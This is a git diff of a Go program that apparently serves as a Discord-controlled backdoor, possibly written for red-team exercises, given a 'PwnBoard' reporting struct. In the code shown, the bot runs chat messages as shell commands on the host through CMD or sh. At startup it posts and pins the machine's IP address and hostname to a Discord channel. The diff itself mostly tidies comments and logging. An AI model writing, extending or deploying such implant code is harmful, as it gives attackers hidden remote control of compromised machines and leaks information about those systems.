@@ -34,6 +34,7 @@ type Config struct {
     } `yaml:"channel"`
 }
 
+// PwnBoard json post request 
 type PwnBoard struct {
 	IPs  string `json:"ip"`
 	Type string `json:"type"`
@@ -49,14 +50,9 @@ func userInput(s disgord.Session, evt *disgord.MessageCreate){
 	if !evt.Message.Author.Bot{
 		if msg.Content == "ping" {
 			s.SendMsg(con, msg.ChannelID, "I am alive. Thanks")	
-		}else if msg.Content == "die"{
+		}else if msg.Content == "die"{ //TODO: Still stop all program, we don't want that
 			// Delete Channel
 			s.DeleteChannel(con, msg.ChannelID)
-			// s.DeleteChannel(con, categoryid)
-			// if debug{
-			// 	s.DeleteChannel(con, categoryid) // <-------------------Remove after testing
-			// }
-			os.Exit(0)
 		}else if msg.Content == "install" {
 			//Install stuff based on OS
 		}else{
@@ -71,12 +67,15 @@ func userInput(s disgord.Session, evt *disgord.MessageCreate){
 			}
 		}
 	}else{
-		fmt.Println("It is a bot")
+		// Do nothing
+		// fmt.Println("It is a bot")
 	}
 }
 
-// shellRun
-//TODO: Large output
+// shellRun runs commands based on OS
+// CMD(for now) --> Windows
+// SH --> Linux based machine, most of them have sh installed
+//TODO: Deal with large output
 func shellRun(cmd string) string{
 	// special cd
 	splittedCommand := strings.Fields(string(cmd))
@@ -198,14 +197,10 @@ func main(){
 
 	defer client.StayConnectedUntilInterrupted(con)
 
-	guild, err := client.GetGuild(con, disgord.Snowflake(id))
-	processError(err)
-	// fmt.Println("Guild Channel: ", guild.Channel)
+	guild, _ := client.GetGuild(con, disgord.Snowflake(id))
 
 	// list of channels
 	channels, _ := client.GetGuildChannels(con, guild.ID)
-	fmt.Println("channels ", channels)
-
 
 	//create catogory
 	category := creator.CreateCategory(client, id, channels, categoryName)
@@ -218,13 +213,15 @@ func main(){
 	subchan := creator.CreateChannel(channels, client, id,  category, channelName)
 
 
-	// sending ip and pinning
-	ipmessage, _ := client.SendMsg(con, subchan.ID, prettyOutput("IP: " + getIP()))
-	client.PinMessage(con, ipmessage)
-	//sending hostname and pinning
+	// sending system ingo
 	hostname , _ := os.Hostname()
-	hostnamemsg, _ := client.SendMsg(con, subchan.ID, prettyOutput("Hostname: " + hostname))
-	client.PinMessage(con, hostnamemsg)
+	systeminfo := ""
+	systeminfo += "IP: " + getIP() + "\n"
+	systeminfo += "Hostname: " + hostname + "\n"
+	systeminfo += "OS: UNKNOW\n"
+
+	systeminfomsg, _ := client.SendMsg(con, subchan.ID, prettyOutput(systeminfo))
+	client.PinMessage(con, systeminfomsg)
 
 	client.On(disgord.EvtMessageCreate, userInput)
 }
